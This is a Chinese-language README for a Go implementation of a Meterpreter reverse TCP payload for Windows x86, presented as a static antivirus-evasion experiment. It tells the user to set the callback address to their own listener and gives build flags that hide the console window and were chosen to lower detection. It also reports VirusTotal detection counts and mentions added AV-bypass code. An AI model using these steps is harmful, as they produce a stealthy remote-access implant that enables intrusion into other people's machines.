# go_meterpreter
Golang实现的x86下的Meterpreter reverse tcp

做静态免杀实验，通过代码修改自[EGESPLOIT](https://github.com/EgeBalci/EGESPLOIT) 这个开源项目。单独实现主要在于减小程序编译后体积。目前编译后的大小在1.2M左右。

## 使用方法

修改go_meterpreter.go中125行代码 s := "http://192.168.121.131:8989" IP和端口修改为自己的地址。然后就可以go build了。
'''
set GOARCH=386
go build -ldflags="-H windowsgui -w"   

'''
注意上面参数中没有-s，因为实际测试，使用这种方式build后的程序免杀效果会好一些。如果直接go build，程序会有窗口，同时大小也在1.6M左右。

## 说明

加入了Bypass AV的代码，我在刚写好的时候上传到VT，查杀结果位8/62。VT上有超过70个引擎，62个应该是加入BypassAV代码起的作用。今天最新经过编译查杀结果为20/70。

VT检测结果地址：[https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection](https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection)

另外，在使用这个的过程中，Windows10中自带的杀毒软件会拦截。会被动态行为发现。这里仅是过静态查杀测试。

